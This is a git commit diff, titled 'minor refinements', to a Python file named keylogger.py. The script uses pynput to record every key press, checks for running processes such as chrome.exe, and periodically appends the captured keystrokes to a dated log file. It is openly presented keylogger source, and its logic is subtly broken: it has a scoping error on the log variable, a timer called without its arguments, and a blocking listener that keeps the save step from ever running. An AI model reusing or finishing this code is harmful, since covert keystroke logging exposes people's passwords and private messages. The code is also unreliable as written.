8ad9aea34baed17511edef1907da43a62f5ad550
blackslash <blackslash@protonmail.com>
2018-03-29 14:49:28 -0700

    minor refinements

--- keylogger.py
+++ keylogger.py
@@ -1,14 +1,14 @@
 from pynput.keyboard import Key, Listener
+from datetime import date
 import psutil
 import os
-import datetime
 import threading
 
 PATH = os.path.dirname(os.path.abspath(__file__))
-date = datetime.date.today()
+log = ''
 
 def on_press(key):
-    print('{0} pressed'.format(key))
+    log += key + ' '
 
 def isRunning(processName):
     for pid in psutil.pids():
@@ -17,22 +17,18 @@ def isRunning(processName):
             return True
     return False
 
+def saveLog(log):
+    with open('{}\\{}_keyslogged.txt'.format(PATH, date.today()), 'a') as f:
+        f.write(log +'\n')
+
 def writeSchedule(log, interval):
     threading.Timer(float(interval), writeSchedule).start()
     saveLog(log)
     return ''
 
-def saveLog(log):
-    with open('{}\\{}_keyslogged.txt'.format(PATH, date), 'a') as f:
-        f.write(log +'\n')
-
 with Listener(on_press=on_press) as listener:
     listener.join()
-
-print(isRunning('chrome.exe'))
-
-
-
+log = writeSchedule(log, 20)
 
 """
 create buffer and save after every t seconds
